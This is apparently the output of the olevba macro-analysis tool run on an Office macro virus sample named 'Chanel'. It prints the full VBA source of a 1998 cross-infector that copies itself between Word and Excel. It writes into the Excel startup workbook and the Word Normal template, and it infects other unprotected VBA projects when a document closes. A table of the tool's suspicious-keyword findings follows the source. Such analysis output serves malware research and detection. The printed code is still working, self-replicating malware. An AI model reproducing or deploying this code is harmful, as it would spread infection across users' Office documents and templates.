olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Chanel-c361700f185a339ec22e03cd81303cd3d1bdaab4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Chanel-c361700f185a339ec22e03cd81303cd3d1bdaab4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Copyright (C) 1998 by FlyShadow ~^^~ - CoCo
Private Declare Function FindWindowA Lib "user32" (ByVal strClassName As String, ByVal lpWindowName As Any) As Long: Dim Јf As String
Private Sub Document_Close()
On Error Resume Next
Јf = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 70): Јd Application
If FindWindowA("XLMain", 0&) Then Јd GetObject(, "Excel.Application"): Exit Sub
Set Јj = CreateObject("Excel.Application")
If UCase(Dir(Јj.StartupPath + "\Book1.")) <> "BOOK1" Then
Set Јc = Јj.Workbooks.Add
Јc.VBProject.VBComponents(1).CodeModule.InsertLines 1, Јf
Јc.SaveAs Јj.StartupPath & "\Book1."
Јc.Quit: End If
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Јf = ThisWorkbook.VBProject.VBComponents(1).CodeModule.Lines(1, 70): Јd Application
If FindWindowA("OpusApp", 0&) Then Јd GetObject(, "Word.Application"): Exit Sub
Set Јj = CreateObject("Word.Application")
If Јj.NormalTemplate.VBProject.Description <> "CoCo" Then
Јj.NormalTemplate.VBProject.Description = "CoCo"
With Јj.NormalTemplate.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString Јf: End With
Јj.Quit: End If
End Sub
Private Sub Јd(Јo As Object)
For Each Јg In Јo.VBE.VBProjects
If Јg.Protection <> 1 And Јg.Description <> "CoCo" Then
Јg.Description = "CoCo": With Јg.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString Јf
End With: End If: Next
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |'Јo.VBE'            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

